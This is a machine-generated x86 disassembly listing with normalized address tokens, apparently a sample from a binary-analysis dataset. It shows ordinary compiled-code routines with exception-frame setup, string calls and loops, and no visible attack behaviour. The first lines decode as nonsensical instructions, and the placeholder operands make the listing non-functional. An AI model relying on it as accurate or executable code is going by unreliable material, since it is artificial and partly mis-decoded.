je r-xdata
xor eax eax
mov esi rw-data
mov [ ebp - 0x4 ] eax
dec ebp
add al ch
mov esi [ ecx + 0x45c7000a ]
les eax [ edx - 0x17 ]
dec ebp
add [ esi - 0x39 ] ah
cmp al 0x54
inc ecx
jo r-xdata
inc ebp
fmul [ eax + eax ]
inc ebx
popad
jo r-xdata
mov edi rw-data
inc [ ebp - 0x1c ]
lea edx [ ebp - 0x4 ]
call 0x45caa054
cld
jne r-xdata
inc esp
imul esp [ ecx + 0x6c ] 0x203e676f
add [ eax ] al
sub_41a198
push ebp
mov ebp esp
add esp 0xffffffd4
mov eax rw-data
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
call sub_4c517c
test ebx ebx
je r-xdata
mov eax [ ebp - 0x2c ]
mov [ fs : 0x0 ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ ebx + 0x8 ]
test edi edi
je r-xdata
test [ ebp + 0xc ] 0x1
je r-xdata
mov esi edi
mov [ ebp - 0x8 ] esi
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
push ebx
call sub_4b0180
pop ecx
mov edx [ ebp - 0x8 ]
mov ecx [ edx ]
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x1c ] 0x24
mov edx 0x3
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov [ ebp - 0x1c ] 0xc
sub_41a330
push ebp
mov ebp esp
add esp 0xffffffd4
mov eax rw-data
push ebx
call sub_4c517c
mov [ ebp - 0x14 ] 0xc
mov eax [ ebp + 0x8 ]
xor edx edx
add eax 0x4
mov [ eax ] edx
lea eax [ ebp - 0x2c ]
inc [ ebp - 0x8 ]
mov ebx [ ebp + 0x8 ]
push eax
add ebx 0x8
call sub_41a398
pop ecx
lea edx [ ebp - 0x2c ]
push edx
lea ecx [ ebx + 0x8 ]
push ecx
call sub_41a3c0
xor eax eax
xor edx edx
mov [ ebx + 0x10 ] eax
xor ecx ecx
mov [ ebx + 0x14 ] edx
mov [ ebx + 0x18 ] ecx
add esp 0x8
inc [ ebp - 0x8 ]
mov eax [ ebp - 0x24 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_41a398
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
push ebx
mov ebx [ ebp + 0x8 ]
call sub_4c517c
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_41a3c0
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
push ebx
mov ebx [ ebp + 0x8 ]
call sub_4c517c
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_41a3e8
push ebp
mov ebp esp
add esp 0xffffffc4
mov eax rw-data
push ebx
push esi
push edi
call sub_4c517c
mov [ ebp - 0x8 ] 0x2
mov edx [ ebp + 0x8 ]
test edx edx
je r-xdata
mov eax [ ebp - 0x24 ]
mov [ fs : 0x0 ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x14 ] 0xc
dec [ ebp - 0x8 ]
mov ebx [ ebp + 0x8 ]
add ebx 0x8
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
xor ecx ecx
xor eax eax
mov [ ebx + 0x10 ] ecx
mov [ ebx + 0x14 ] eax
xor edx edx
mov [ ebx + 0x18 ] edx
mov edx 0x2
dec [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
add eax 0x4
call sub_4d318c
test [ ebp + 0xc ] 0x1
je r-xdata
mov esi [ ebx + 0x14 ]
mov edi [ ebx + 0x10 ]
lea edx [ ebx + 0x8 ]
lea eax [ ebp - 0x30 ]
mov [ ebp - 0x28 ] edx
mov ecx [ ebp - 0x38 ]
mov [ ebp - 0x30 ] ecx
mov ecx [ ebp - 0x34 ]
mov [ ebp - 0x2c ] ecx
push [ eax + 0x4 ]
push [ eax ]
mov ecx [ ebp - 0x28 ]
push ecx
push esi
push edi
call sub_406ae0
add esp 0x14
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x3c ] eax
mov edx [ ebp - 0x3c ]
push edx
call sub_4b0180
pop ecx
mov ecx [ ebp + 0x8 ]
push ecx
call sub_4b0180
pop ecx
sub_41a4a4
push ebp
mov ebp esp
add esp 0xfffffeac
mov eax rw-data
push ebx
push esi
push edi
call sub_4c517c
mov [ ebp - 0xbc ] 0xc
mov [ ebp - 0xbc ] 0x18
mov dl 0x1
mov eax [ r-xdata ]
call sub_42723c
mov ebx eax
lea eax [ ebp - 0x18 ]
mov [ ebp - 0xc ] ebx
mov edx rw-data
inc [ ebp - 0xb0 ]
xor ecx ecx
mov [ ebp - 0xbc ] 0x24
mov [ ebp - 0xbc ] 0x30
call sub_4d25d8
inc [ ebp - 0xb0 ]
inc [ ebp - 0xb0 ]
lea edx [ ebp - 0x18 ]
xor eax eax
mov [ ebp - 0x1c ] eax
inc [ ebp - 0xb0 ]
lea ecx [ ebp - 0x1c ]
inc [ ebp - 0xb0 ]
mov eax [ rw-data ]
add eax 0x4
call sub_402e08
xor edx edx
mov [ ebp - 0x20 ] edx
lea edx [ ebp - 0x1c ]
lea eax [ ebp - 0x20 ]
call sub_41e604
lea ecx [ ebp - 0x20 ]
inc [ ebp - 0xb0 ]
mov edx [ ecx ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
dec [ ebp - 0xb0 ]
lea eax [ ebp - 0x20 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0xb0 ]
dec [ ebp - 0xb0 ]
lea eax [ ebp - 0x1c ]
xor edx edx
call sub_4d2728
dec [ ebp - 0xb0 ]
dec [ ebp - 0xb0 ]
lea eax [ ebp - 0x18 ]
xor edx edx
call sub_4d2728
mov [ ebp - 0xbc ] 0x3c
mov edx rw-data
lea eax [ ebp - 0x24 ]
xor ecx ecx
call sub_4d25d8
inc [ ebp - 0xb0 ]
lea eax [ ebp - 0x24 ]
inc [ ebp - 0xb0 ]
mov edx [ eax ]
push edx
push rw-data
push 0x20
push rw-data
push rw-data
call sub_41c26c
add esp 0x14
dec [ ebp - 0xb0 ]
dec [ ebp - 0xb0 ]
lea eax [ ebp - 0x24 ]
xor edx edx
call sub_4d2728
mov cl [ rw-data ]
test cl cl
je r-xdata
mov [ ebp - 0xce ] 0x7c
mov [ ebp - 0xbc ] 0x24
mov [ ebp - 0xbc ] 0x54
xor eax eax
xor ebx ebx
mov [ ebp - 0x30 ] eax
mov edx ebx
inc [ ebp - 0xb0 ]
inc ebx
mov eax [ ebp - 0xc ]
lea ecx [ ebp - 0x30 ]
mov esi [ eax ]
call [ esi + 0xc ]
lea eax [ ebp - 0x30 ]
push eax
mov edx rw-data
lea eax [ ebp - 0x34 ]
call sub_4d3128
inc [ ebp - 0xb0 ]
lea edx [ ebp - 0x34 ]
pop eax
call sub_4d3258
push eax
dec [ ebp - 0xb0 ]
lea eax [ ebp - 0x34 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0xb0 ]
lea eax [ ebp - 0x30 ]
mov edx 0x2
call sub_4d318c
pop ecx
test cl cl
je r-xdata
mov [ ebp - 0xbc ] 0x24
xor ebx ebx
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax 0x4
jge r-xdata
mov [ ebp - 0xce ] 0x3a
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov edx rw-data
mov [ eax ] 0x1
mov [ ebp - 0xbc ] 0x60
lea eax [ ebp - 0x38 ]
call sub_4d3010
inc [ ebp - 0xb0 ]
lea edx [ ebp - 0x38 ]
mov eax [ ebp + 0x8 ]
add eax 0x4
call sub_4d31b4
dec [ ebp - 0xb0 ]
lea eax [ ebp - 0x38 ]
mov edx 0x2
call sub_4d318c
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jl r-xdata
mov [ ebp - 0xbc ] 0xb4
xor edx edx
mov [ ebp - 0x48 ] edx
lea ecx [ ebp - 0x48 ]
inc [ ebp - 0xb0 ]
mov edx ebx
inc ebx
mov eax [ ebp - 0xc ]
mov esi [ eax ]
call [ esi + 0xc ]
lea eax [ ebp - 0x48 ]
call sub_4d3514
mov [ ebp - 0xd4 ] eax
dec [ ebp - 0xb0 ]
lea eax [ ebp - 0x48 ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0xbc ] 0xa8
mov [ ebp - 0xbc ] 0xc0
xor ecx ecx
mov [ ebp - 0x4c ] ecx
lea ecx [ ebp - 0x4c ]
inc [ ebp - 0xb0 ]
mov edx ebx
inc ebx
mov eax [ ebp - 0xc ]
mov esi [ eax ]
call [ esi + 0xc ]
lea eax [ ebp - 0x4c ]
call sub_4d3514
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
dec [ ebp - 0xb0 ]
lea eax [ ebp - 0x4c ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0xbc ] 0xcc
xor ecx ecx
mov [ ebp - 0x50 ] ecx
lea ecx [ ebp - 0x50 ]
inc [ ebp - 0xb0 ]
mov edx ebx
inc ebx
mov eax [ ebp - 0xc ]
mov esi [ eax ]
call [ esi + 0xc ]
lea edx [ ebp - 0x50 ]
mov eax [ ebp + 0x8 ]
add eax 0x4
call sub_4d31b4
dec [ ebp - 0xb0 ]
lea eax [ ebp - 0x50 ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0xbc ] 0x24
mov [ ebp - 0xbc ] 0x6c
mov edx rw-data
lea eax [ ebp - 0x3c ]
xor ecx ecx
call sub_4d25d8
inc [ ebp - 0xb0 ]
lea eax [ ebp - 0x3c ]
inc [ ebp - 0xb0 ]
mov edx [ eax ]
push edx
push rw-data
push 0x35
push rw-data
push rw-data
call sub_41c1fc
add esp 0x14
dec [ ebp - 0xb0 ]
dec [ ebp - 0xb0 ]
lea eax [ ebp - 0x3c ]
xor edx edx
call sub_4d2728
dec [ ebp - 0xb0 ]
mov ecx [ ebp - 0xc ]
test ecx ecx
je r-xdata
mov [ ebp - 0xbc ] 0x24
mov esi ebx
jmp r-xdata
mov [ ebp - 0xbc ] 0x48
xor eax eax
mov [ ebp - 0x28 ] eax
lea ecx [ ebp - 0x28 ]
inc [ ebp - 0xb0 ]
mov edx ebx
mov eax [ ebp - 0xc ]
mov esi [ eax ]
call [ esi + 0xc ]
lea edx [ ebp - 0x28 ]
lea eax [ ebp - 0x2c ]
xor ecx ecx
call sub_4d2680
inc [ ebp - 0xb0 ]
lea eax [ ebp - 0x2c ]
inc [ ebp - 0xb0 ]
mov edx [ eax ]
push edx
push rw-data
push 0x24
push rw-data
push rw-data
call sub_41c2dc
add esp 0x14
dec [ ebp - 0xb0 ]
dec [ ebp - 0xb0 ]
lea eax [ ebp - 0x2c ]
xor edx edx
call sub_4d2728
dec [ ebp - 0xb0 ]
lea eax [ ebp - 0x28 ]
mov edx 0x2
call sub_4d318c
inc ebx
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp esi eax
jl r-xdata
mov [ ebp - 0xbc ] 0x78
mov eax [ ebp - 0xcc ]
mov [ fs : 0x0 ] eax
jmp r-xdata
mov ebx [ ebp - 0xc ]
mov esi ebx
mov [ ebp - 0x44 ] esi
test esi esi
je r-xdata
mov [ ebp - 0xbc ] 0xe4
xor eax eax
mov [ ebp - 0x54 ] eax
lea ecx [ ebp - 0x54 ]
inc [ ebp - 0xb0 ]
mov edx esi
mov eax [ ebp - 0xc ]
mov edi [ eax ]
call [ edi + 0xc ]
lea eax [ ebp - 0x54 ]
xor ecx ecx
push eax
lea eax [ ebp - 0x58 ]
mov dx [ ebp - 0xce ]
mov [ ebp - 0xd6 ] dx
mov edx 0x1
mov [ ebp - 0x58 ] ecx
call sub_4d3380
mov ebx eax
push 0x1
push ebx
call sub_4d2f8c
add esp 0x8
mov eax ebx
call sub_4d3340
mov edx [ ebx ]
mov cx [ ebp - 0xd6 ]
mov [ edx ] cx
inc [ ebp - 0xb0 ]
lea edx [ ebp - 0x58 ]
pop eax
call sub_4d3394
mov ebx eax
dec [ ebp - 0xb0 ]
lea eax [ ebp - 0x58 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0xb0 ]
lea eax [ ebp - 0x54 ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0xbc ] 0xd8
test ebx ebx
jle r-xdata
mov [ ebp - 0xbc ] 0x150
mov ebx [ ebp + 0x8 ]
add ebx 0x8
mov eax [ ebx + 0x10 ]
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x44 ]
mov edx [ eax ]
mov [ ebp - 0x40 ] edx
mov [ ebp - 0xbc ] 0x9c
mov edx 0x3
mov eax [ ebp - 0x44 ]
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov [ ebp - 0xbc ] 0x84
mov [ ebp - 0xbc ] 0x24
inc esi
mov [ ebp - 0xbc ] 0xfc
xor ecx ecx
lea eax [ ebp - 0x5c ]
mov [ ebp - 0x5c ] ecx
push eax
inc [ ebp - 0xb0 ]
xor edx edx
mov [ ebp - 0x64 ] edx
mov edx esi
inc [ ebp - 0xb0 ]
lea ecx [ ebp - 0x64 ]
mov eax [ ebp - 0xc ]
mov edi [ eax ]
call [ edi + 0xc ]
lea eax [ ebp - 0x64 ]
lea ecx [ ebx - 0x1 ]
mov edx 0x1
call sub_4d342c
dec [ ebp - 0xb0 ]
lea eax [ ebp - 0x64 ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0xbc ] 0xf0
mov [ ebp - 0xbc ] 0x108
xor ecx ecx
lea eax [ ebp - 0x60 ]
mov [ ebp - 0x60 ] ecx
push eax
inc [ ebp - 0xb0 ]
xor edx edx
mov [ ebp - 0x6c ] edx
mov edx esi
inc [ ebp - 0xb0 ]
lea ecx [ ebp - 0x6c ]
mov eax [ ebp - 0xc ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x6c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ ebx + 0x10 ]
sub eax edx
mov ecx 0xc
cdq
idiv ecx
mov esi eax
xor esi esi
jmp r-xdata
xor ecx ecx
mov edx [ ebp - 0x6c ]
mov ecx [ edx - 0x4 ]
jmp r-xdata
mov [ ebp - 0xbc ] 0x24
mov [ ebp - 0xbc ] 0xc
mov [ ebp - 0xbc ] 0x0
jmp r-xdata
mov ebx [ ebp - 0xc ]
mov [ ebp - 0xa0 ] ebx
mov eax [ ebp - 0xa0 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebp - 0x88 ] eax
push esi
push rw-data
lea edx [ ebp - 0x88 ]
push edx
call sub_4d3324
add esp 0xc
lea edx [ ebp - 0x88 ]
inc [ ebp - 0xb0 ]
xor eax eax
mov [ ebp - 0x8c ] eax
lea ecx [ ebp - 0x8c ]
inc [ ebp - 0xb0 ]
mov eax rw-data
call sub_4d3564
lea edx [ ebp - 0x8c ]
push edx
mov edx rw-data
lea eax [ ebp - 0x90 ]
call sub_4d3010
inc [ ebp - 0xb0 ]
xor eax eax
mov [ ebp - 0x94 ] eax
lea edx [ ebp - 0x90 ]
inc [ ebp - 0xb0 ]
lea ecx [ ebp - 0x94 ]
pop eax
call sub_4d31c8
lea edx [ ebp - 0x94 ]
lea eax [ ebp - 0x98 ]
xor ecx ecx
call sub_4d2680
inc [ ebp - 0xb0 ]
lea edx [ ebp - 0x98 ]
inc [ ebp - 0xb0 ]
mov eax [ edx ]
push eax
push rw-data
push 0x52
push rw-data
push rw-data
call sub_41c2dc
add esp 0x14
dec [ ebp - 0xb0 ]
dec [ ebp - 0xb0 ]
lea eax [ ebp - 0x98 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0xb0 ]
lea eax [ ebp - 0x94 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0xb0 ]
lea eax [ ebp - 0x90 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0xb0 ]
lea eax [ ebp - 0x8c ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0xb0 ]
lea eax [ ebp - 0x88 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0xb0 ]
mov ecx [ ebp - 0xc ]
test ecx ecx
je r-xdata
dec [ ebp - 0xb0 ]
lea eax [ ebp - 0x60 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0xb0 ]
lea eax [ ebp - 0x5c ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0xbc ] 0xd8
mov [ ebp - 0xbc ] 0x12c
xor ecx ecx
lea eax [ ebp - 0x74 ]
mov [ ebp - 0x74 ] ecx
push eax
inc [ ebp - 0xb0 ]
lea eax [ ebp - 0x60 ]
lea ecx [ ebx - 0x1 ]
mov edx 0x1
call sub_4d342c
mov [ ebp - 0xbc ] 0x120
mov [ ebp - 0xbc ] 0x138
xor ecx ecx
lea eax [ ebp - 0x78 ]
mov [ ebp - 0x78 ] ecx
push eax
inc [ ebp - 0xb0 ]
mov edx [ ebp - 0x60 ]
test edx edx
je r-xdata
sub ecx ebx
xor eax eax
push ecx
mov [ ebp - 0x68 ] eax
inc [ ebp - 0xb0 ]
lea ecx [ ebp - 0x68 ]
mov eax [ ebp - 0xc ]
mov edx esi
mov edi [ eax ]
call [ edi + 0xc ]
lea eax [ ebp - 0x68 ]
lea edx [ ebx + 0x1 ]
pop ecx
call sub_4d342c
dec [ ebp - 0xb0 ]
lea eax [ ebp - 0x6c ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0xb0 ]
lea eax [ ebp - 0x68 ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0xbc ] 0xf0
mov [ ebp - 0xbc ] 0x114
mov di [ ebp - 0xce ]
xor ecx ecx
mov [ ebp - 0x70 ] ecx
lea eax [ ebp - 0x70 ]
mov edx 0x1
call sub_4d3380
mov ebx eax
push 0x1
push ebx
call sub_4d2f8c
add esp 0x8
mov eax ebx
call sub_4d3340
mov edx [ ebx ]
lea eax [ ebp - 0x60 ]
mov [ edx ] di
lea edx [ ebp - 0x70 ]
inc [ ebp - 0xb0 ]
call sub_4d3394
mov ebx eax
dec [ ebp - 0xb0 ]
lea eax [ ebp - 0x70 ]
mov edx 0x2
call sub_4d318c
test ebx ebx
jle r-xdata
mov ecx [ ebp - 0xcc ]
mov [ fs : 0x0 ] ecx
mov edx [ ebp - 0xa0 ]
mov ecx [ edx ]
mov [ ebp - 0x9c ] ecx
mov [ ebp - 0xbc ] 0x174
mov edx 0x3
mov eax [ ebp - 0xa0 ]
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov [ ebp - 0xbc ] 0x15c
xor ecx ecx
mov ecx [ ebp - 0x60 ]
mov ecx [ ecx - 0x4 ]
jmp r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ ebx + 0x10 ]
sub eax edx
mov ecx 0xc
cdq
idiv ecx
mov ecx eax
xor ecx ecx
jmp r-xdata
sub ecx ebx
lea edx [ ebx + 0x1 ]
lea eax [ ebp - 0x60 ]
call sub_4d342c
mov [ ebp - 0xbc ] 0x120
mov [ ebp - 0xbc ] 0x144
mov eax [ ebp - 0x78 ]
push eax
mov edx [ ebp - 0x74 ]
push edx
mov ecx [ ebp - 0x5c ]
push ecx
lea eax [ ebp - 0x84 ]
push eax
call sub_41b864
add [ ebp - 0xb0 ] 0x4
mov ebx [ ebp + 0x8 ]
mov edi eax
add ebx 0x8
add esp 0x10
mov eax [ ebx + 0x10 ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x18 ]
mov edx [ ebx + 0x10 ]
sub eax edx
push ecx
mov ecx 0xc
cdq
idiv ecx
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
mov eax [ ebx + 0x10 ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x14 ]
mov [ ebp - 0xf4 ] eax
mov edx [ ebp - 0xf4 ]
mov [ ebp - 0x10c ] edx
mov ecx [ ebx + 0x10 ]
test ecx ecx
jne r-xdata
mov eax [ ebx + 0x14 ]
lea ecx [ ebx + 0x8 ]
mov [ ebp - 0xdc ] eax
mov [ ebp - 0xe0 ] ecx
mov eax [ ebp - 0xf0 ]
lea edx [ ebp - 0xe8 ]
mov [ ebp - 0xe8 ] eax
mov eax [ ebp - 0xec ]
mov [ ebp - 0xe4 ] eax
push [ edx + 0x4 ]
push [ edx ]
mov eax [ ebp - 0xe0 ]
push eax
push edi
push 0x1
mov edx [ ebp - 0xdc ]
push edx
call sub_4182f0
add esp 0x18
mov ecx [ ebp - 0xdc ]
add ecx 0xc
mov [ ebx + 0x14 ] ecx
jmp r-xdata
cmp ecx edx
jae r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ ebx + 0x10 ]
sub eax edx
mov ecx 0xc
cdq
idiv ecx
xor eax eax
jmp r-xdata
dec [ ebp - 0xb0 ]
dec [ ebp - 0xb0 ]
lea eax [ ebp - 0x7c ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0xb0 ]
lea eax [ ebp - 0x80 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0xb0 ]
lea eax [ ebp - 0x84 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0xb0 ]
lea eax [ ebp - 0x78 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0xb0 ]
lea eax [ ebp - 0x74 ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0xbc ] 0xf0
mov eax [ ebx + 0x10 ]
mov [ ebp - 0xfc ] eax
mov edx [ ebp - 0xfc ]
mov [ ebp - 0x11c ] edx
mov eax [ ebp - 0x10c ]
mov edx [ ebp - 0x11c ]
sub eax edx
mov ecx 0xc
cdq
idiv ecx
xor eax eax
jmp r-xdata
test eax eax
jne r-xdata
mov [ ebp - 0xf8 ] eax
push edi
push 0x1
add esp 0xfffffff0
mov eax [ ebp - 0x114 ]
mov [ esp ] eax
mov eax [ ebp - 0x110 ]
mov [ esp + 0x4 ] eax
mov eax [ ebp - 0x10c ]
mov [ esp + 0x8 ] eax
push ebx
call sub_418418
add esp 0x1c
mov edx [ ebp - 0xf8 ]
mov [ ebp - 0x100 ] edx
mov ecx [ ebx + 0x10 ]
mov [ ebp - 0x104 ] ecx
mov eax [ ebp - 0x104 ]
mov [ ebp - 0x12c ] eax
mov edx [ ebp - 0x134 ]
mov [ ebp - 0x144 ] edx
mov edx [ ebp - 0x130 ]
mov [ ebp - 0x140 ] edx
mov ecx [ ebp - 0x12c ]
mov [ ebp - 0x13c ] ecx
mov eax [ ebp - 0x100 ]
shl eax 0x2
lea eax [ eax + eax * 2 ]
add [ ebp - 0x13c ] eax
mov edx [ ebp - 0x144 ]
mov [ ebp - 0x154 ] edx
mov edx [ ebp - 0x140 ]
mov [ ebp - 0x150 ] edx
mov ecx [ ebp - 0x13c ]
mov [ ebp - 0x14c ] ecx
sub_41b168
push ebp
mov ebp esp
add esp 0xffffff90
mov eax rw-data
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
call sub_4c517c
mov [ ebp - 0x5c ] 0xc
mov dl 0x1
mov eax [ r-xdata ]
call sub_42723c
mov ebx eax
lea eax [ ebp - 0x14 ]
mov [ ebp - 0x8 ] ebx
mov edx rw-data
inc [ ebp - 0x50 ]
mov [ ebp - 0x5c ] 0x18
mov [ ebp - 0x5c ] 0x24
call sub_4d3128
inc [ ebp - 0x50 ]
mov edx [ eax ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
dec [ ebp - 0x50 ]
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0x5c ] 0x30
mov edx rw-data
lea eax [ ebp - 0x18 ]
call sub_4d3128
inc [ ebp - 0x50 ]
mov edx [ eax ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
dec [ ebp - 0x50 ]
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0x5c ] 0x3c
mov ebx [ esi ]
xor ecx ecx
mov [ ebp - 0x1c ] ecx
push ebx
push rw-data
lea eax [ ebp - 0x1c ]
push eax
call sub_4d3324
add esp 0xc
lea edx [ ebp - 0x1c ]
inc [ ebp - 0x50 ]
mov edx [ edx ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
dec [ ebp - 0x50 ]
lea eax [ ebp - 0x1c ]
mov edx 0x2
call sub_4d318c
mov edx [ esi + 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov [ ebp - 0x5c ] 0x18
xor ebx ebx
jmp r-xdata
lea ecx [ esi + 0x8 ]
mov eax [ ecx + 0x10 ]
test eax eax
jne r-xdata
mov eax [ ecx + 0x14 ]
mov edx [ ecx + 0x10 ]
sub eax edx
mov ecx 0xc
cdq
idiv ecx
mov edx eax
xor edx edx
jmp r-xdata
mov [ ebp - 0x5c ] 0x54
xor eax eax
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0x24 ]
mov edx 0x1
call sub_4d3380
mov edi eax
push 0x1
push edi
call sub_4d2f8c
add esp 0x8
mov eax edi
call sub_4d3340
mov edx [ edi ]
mov edi ebx
xor eax eax
lea ecx [ ebp - 0x28 ]
mov [ edx ] 0x7c
lea edx [ ebp - 0x24 ]
inc [ ebp - 0x50 ]
mov [ ebp - 0x28 ] eax
shl edi 0x2
inc [ ebp - 0x50 ]
mov eax [ esi + 0x18 ]
lea edi [ edi + edi * 2 ]
add eax edi
call sub_4d31c8
xor edx edx
mov edi ebx
mov [ ebp - 0x2c ] edx
lea eax [ ebp - 0x28 ]
shl edi 0x2
lea ecx [ ebp - 0x2c ]
inc [ ebp - 0x50 ]
mov edx [ esi + 0x18 ]
lea edi [ edi + edi * 2 ]
add edx edi
add edx 0x4
call sub_4d31c8
lea eax [ ebp - 0x2c ]
push eax
xor edx edx
mov [ ebp - 0x30 ] edx
lea eax [ ebp - 0x30 ]
mov edx 0x1
call sub_4d3380
mov [ ebp - 0x70 ] eax
push 0x1
mov ecx [ ebp - 0x70 ]
push ecx
call sub_4d2f8c
add esp 0x8
mov eax [ ebp - 0x70 ]
call sub_4d3340
mov edx [ ebp - 0x70 ]
xor eax eax
mov ecx [ edx ]
lea edx [ ebp - 0x30 ]
mov [ ecx ] 0x7c
lea ecx [ ebp - 0x34 ]
inc [ ebp - 0x50 ]
mov [ ebp - 0x34 ] eax
inc [ ebp - 0x50 ]
pop eax
call sub_4d31c8
xor edx edx
mov edi ebx
mov [ ebp - 0x20 ] edx
lea eax [ ebp - 0x34 ]
shl edi 0x2
lea ecx [ ebp - 0x20 ]
inc [ ebp - 0x50 ]
mov edx [ esi + 0x18 ]
lea edi [ edi + edi * 2 ]
add edx edi
add edx 0x8
call sub_4d31c8
dec [ ebp - 0x50 ]
lea eax [ ebp - 0x34 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x50 ]
lea eax [ ebp - 0x30 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x50 ]
lea eax [ ebp - 0x2c ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x50 ]
lea eax [ ebp - 0x28 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x50 ]
lea eax [ ebp - 0x24 ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0x5c ] 0x48
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
dec [ ebp - 0x50 ]
lea eax [ ebp - 0x20 ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0x5c ] 0x18
inc ebx
mov [ ebp - 0x5c ] 0x60
mov edx rw-data
lea eax [ ebp - 0x38 ]
xor ecx ecx
call sub_4d25d8
inc [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
lea edx [ ebp - 0x38 ]
xor eax eax
mov [ ebp - 0x3c ] eax
inc [ ebp - 0x50 ]
lea ecx [ ebp - 0x3c ]
inc [ ebp - 0x50 ]
mov eax [ rw-data ]
add eax 0x4
call sub_402e08
xor edx edx
mov [ ebp - 0x40 ] edx
lea edx [ ebp - 0x3c ]
lea eax [ ebp - 0x40 ]
call sub_41e604
lea ecx [ ebp - 0x40 ]
inc [ ebp - 0x50 ]
mov eax [ ecx ]
push eax
call sub_43c9e8
mov ecx eax
mov eax [ ebp - 0x8 ]
pop edx
mov ebx [ eax ]
call [ ebx + 0x80 ]
dec [ ebp - 0x50 ]
lea eax [ ebp - 0x40 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x50 ]
dec [ ebp - 0x50 ]
lea eax [ ebp - 0x3c ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x50 ]
dec [ ebp - 0x50 ]
lea eax [ ebp - 0x38 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x50 ]
mov esi [ ebp - 0x8 ]
test esi esi
je r-xdata
cmp edx ebx
ja r-xdata
mov [ ebp - 0x5c ] 0x18
mov eax [ ebp - 0x6c ]
mov [ fs : 0x0 ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ebx esi
mov edi ebx
mov [ ebp - 0x48 ] edi
test edi edi
je r-xdata
mov eax [ ebp - 0x48 ]
mov edx [ eax ]
mov [ ebp - 0x44 ] edx
mov [ ebp - 0x5c ] 0x84
mov edx 0x3
mov eax [ ebp - 0x48 ]
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov [ ebp - 0x5c ] 0x6c
sub_41b4c4
push ebp
mov ebp esp
add esp 0xffffffa4
